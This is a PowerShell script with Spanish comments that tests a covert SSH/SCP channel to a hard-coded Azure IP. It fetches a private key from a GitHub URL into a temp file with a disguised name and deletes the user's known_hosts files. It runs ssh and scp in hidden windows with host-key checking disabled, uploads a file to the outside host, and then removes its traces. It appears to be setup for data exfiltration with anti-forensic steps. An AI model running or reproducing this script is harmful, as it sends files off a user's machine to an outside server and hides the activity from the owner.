# --- CONFIGURACION ---
$IP     = "4.172.250.253"
$USER   = "azureuser"
$PORT   = "22"
$PEM    = "$env:LOCALAPPDATA\Temp\eprv3330ffz.tmp"
$URL    = "https://github.com/cibersegmx/my_stuff/raw/main/eprv3330ffz.tmp"

Write-Host "[+] Descargando PEM..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($URL, $PEM)
Write-Host "    [OK] PEM: $((Get-Item $PEM).Length) bytes" -ForegroundColor Green

Write-Host "[+] Limpiando known_hosts..." -ForegroundColor Cyan
Remove-Item "$env:USERPROFILE\.ssh\known_hosts*" -Force -ErrorAction SilentlyContinue
Write-Host "    [OK] Borrado" -ForegroundColor Green

Write-Host "[+] Probando SSH..." -ForegroundColor Cyan
$ssh = "C:\Windows\System32\OpenSSH\ssh.exe"
if (-not (Test-Path $ssh)) { $ssh = "C:\Windows\SysWOW64\OpenSSH\ssh.exe" }

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $ssh
$psi.Arguments = "-p $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=15 -i `"$PEM`" ${USER}@${IP} echo SSH_OK"
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true

$proc = [System.Diagnostics.Process]::Start($psi)
$proc.WaitForExit(20000) | Out-Null
if (-not $proc.HasExited) { $proc.Kill() | Out-Null }

$out = $proc.StandardOutput.ReadToEnd().Trim()
$err = $proc.StandardError.ReadToEnd().Trim()

if ($proc.ExitCode -eq 0 -and $out -eq "SSH_OK") {
    Write-Host "    [OK] SSH CONECTADO" -ForegroundColor Green
} else {
    Write-Host "    [FALLA] SSH: $err" -ForegroundColor Red
    Remove-Item $PEM -Force -ErrorAction SilentlyContinue
    exit 1
}

Write-Host "[+] Probando SCP..." -ForegroundColor Cyan
$testFile = "$env:LOCALAPPDATA\Temp\test_scp_$(Get-Random).txt"
"SCP_TEST_OK" | Out-File $testFile -Encoding ASCII

$scp = "C:\Windows\System32\OpenSSH\scp.exe"
if (-not (Test-Path $scp)) { $scp = "C:\Windows\SysWOW64\OpenSSH\scp.exe" }

$scpPsi = New-Object System.Diagnostics.ProcessStartInfo
$scpPsi.FileName = $scp
$scpPsi.Arguments = "-P $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=30 -i `"$PEM`" `"$testFile`" ${USER}@${IP}:/home/$USER/"
$scpPsi.RedirectStandardOutput = $true
$scpPsi.RedirectStandardError = $true
$scpPsi.UseShellExecute = $false
$scpPsi.CreateNoWindow = $true

$scpProc = [System.Diagnostics.Process]::Start($scpPsi)
$scpProc.WaitForExit(30000) | Out-Null
if (-not $scpProc.HasExited) { $scpProc.Kill() | Out-Null }

if ($scpProc.ExitCode -eq 0) {
    Write-Host "    [OK] SCP FUNCIONA - Archivo subido" -ForegroundColor Green
} else {
    Write-Host "    [FALLA] SCP: $($scpProc.StandardError.ReadToEnd())" -ForegroundColor Red
}

# LIMPIAR
Remove-Item $PEM -Force -ErrorAction SilentlyContinue
Remove-Item $testFile -Force -ErrorAction SilentlyContinue
Write-Host "[+] Prueba completada" -ForegroundColor Cyan
